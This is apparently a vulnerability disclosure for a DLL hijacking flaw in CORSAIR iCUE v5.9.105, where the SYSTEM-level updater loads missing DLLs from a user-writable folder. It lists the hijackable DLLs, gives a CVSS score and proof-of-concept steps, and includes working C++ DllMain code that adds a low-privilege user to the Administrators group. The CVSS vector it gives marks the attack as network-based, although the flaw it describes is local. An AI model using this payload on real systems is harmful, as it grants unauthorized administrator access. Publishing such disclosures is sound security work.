
## Vulnerable software and version
- Software download link: [CORSAIR iCUE v5.9.105 with iCUE Murals](https://www.corsair.com/es/es/s/downloads)
## Description
A DLL Hijacking vulnerability has been identified in iCUE v5.9.105. This vulnerability occurs during the update process, managed by the "iCUEUpdateService" service. The service spawns a process ("cuepkg.exe") responsible for conducting the update, running with "NT AUTHORITY\SYSTEM" privileges. When initiating the process, it searches for various DLLs in the directory `\cuepkg-1.2.6`, located within the iCUE installation directory. Some of these DLLs are not present by default, but as a regular user has the privileges to create files in that directory, an attacker could potentially introduce a malicious DLL into the directory. Consequently, this malicious DLL would be loaded by `cuepkg.exe` with Administrator privileges.

The affected DLLs **detected** are the following:
- `MSASN1.dll`
- `NTASN1.dll`
- `profapi.dll`

CVSS Vector: `(AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)`
- **Base Score:** 7.8 (High)
- **Temporal Score:** 7.8 (High)
- **Environmental Score:** 7.8 (High)

## PoC
As an example, the DLL `profapi.dll` will be taken.
1. Create our malicious DLL and add it to the directory `%INSTALLDIR%cuepkg-1.2.6`.
2. Wait for the program to update automatically or, in this case, force the update by clicking "Check for updates".
3. Our user without Administrator privileges is added to the group.

Privileges of the `lowpriv` user **before** the malicious DLL is executed:
![lowpriv_cmd](https://github.com/0xkickit/iCUE_DllHijack_LPE/blob/main/lowpriv_cmd.png)

Privileges of the `lowpriv` user **after** the malicious DLL is executed:
![lowpriv_cmd_adm](https://github.com/0xkickit/iCUE_DllHijack_LPE/blob/main/lowpriv_cmd_adm.png)

- Example malicious code:
```cpp
#include "pch.h"
#include <windows.h>
#include <cstdlib>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    {
        system("net localgroup Administrators desktop-ckfiane\\lowpriv /add");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}
```
